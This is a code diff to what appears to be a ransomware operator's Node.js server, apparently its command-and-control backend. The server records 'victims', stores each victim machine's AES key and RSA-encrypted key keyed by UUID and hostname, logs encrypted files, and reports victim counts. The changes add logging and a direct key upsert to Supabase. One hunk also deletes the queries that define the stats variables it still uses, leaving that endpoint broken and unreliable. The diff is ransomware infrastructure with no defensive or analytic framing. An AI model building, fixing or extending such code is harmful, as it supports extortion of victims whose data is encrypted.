@@ -145,12 +145,12 @@ async function saveEncryptedFile(data) {
       aes_key: data.aesKey
     });
     if (error) {
-      console.log(`[DB Error] encrypted: ${error.message}`);
+      console.error(`[DB Error] encrypted insert: ${error.message} - Data:`, JSON.stringify(data));
     } else {
-      console.log('[Supabase] Encrypted file saved successfully');
+      console.log(`[Supabase] Encrypted file metadata saved: ${data.archivo}`);
     }
   } catch (e) {
-    console.log(`[DB Failed] encrypted: ${e.message}`);
+    console.error(`[DB Exception] encrypted: ${e.message}`);
   }
 }
 
@@ -344,12 +344,27 @@ async function obtenerClaveCliente(clienteId, clienteName = null, uuid = null) {
 
       // FORCE SYNC TO CLOUD (Correcting the missing data issue)
       if (uuid) {
-        saveKey({
-          uuid: uuid,
-          hostname: clienteName,
-          aes_key: key,
-          encrypted_aes_key: encryptedKey
-        });
+        // Debug logging added
+        console.log(`[Supabase] Saving key for UUID: ${uuid} | AES: ${key ? 'YES' : 'NULL'} | RSA-Enc: ${encryptedKey ? 'YES' : 'NULL'}`);
+        try {
+          const { error } = await supabase
+            .from('keys')
+            .upsert({
+              uuid: uuid,
+              hostname: clienteName,
+              aes_key: key,
+              encrypted_aes_key: encryptedKey,
+              created_at: new Date().toISOString()
+            }, { onConflict: 'uuid' });
+
+          if (error) {
+            console.error(`[DB Error] Keys Upsert: ${error.message}`);
+          } else {
+            console.log(`[Supabase] Key synced successfully for ${clienteName}`);
+          }
+        } catch (e) {
+          console.error(`[DB Exception] Keys: ${e.message}`);
+        }
       }
 
       return key;
@@ -517,11 +532,11 @@ app.get('/api/db/stats', async (req, res) => {
     return res.json({ success: false, victims: 0, keys: 0, encrypted: 0 });
   }
   try {
-    const [v, k, e] = await Promise.all([
-      supabase.from('victims').select('id', { count: 'exact', head: true }),
-      supabase.from('keys').select('id', { count: 'exact', head: true }),
-      supabase.from('encrypted_files').select('id', { count: 'exact', head: true })
-    ]);
+    // Debug info
+    if (v.error) console.error('[Stats Error] Victims:', v.error);
+    if (k.error) console.error('[Stats Error] Keys:', k.error);
+    if (e.error) console.error('[Stats Error] Encrypted:', e.error);
+
     res.json({
       success: true,
       victims: v.count || 0,
@@ -529,7 +544,8 @@ app.get('/api/db/stats', async (req, res) => {
       encrypted: e.count || 0
     });
   } catch (e) {
-    res.json({ success: false, victims: 0, keys: 0, encrypted: 0 });
+    console.error('[Stats Exception]', e);
+    res.json({ success: false, victims: 0, keys: 0, encrypted: 0, error: e.message });
   }
 });
 
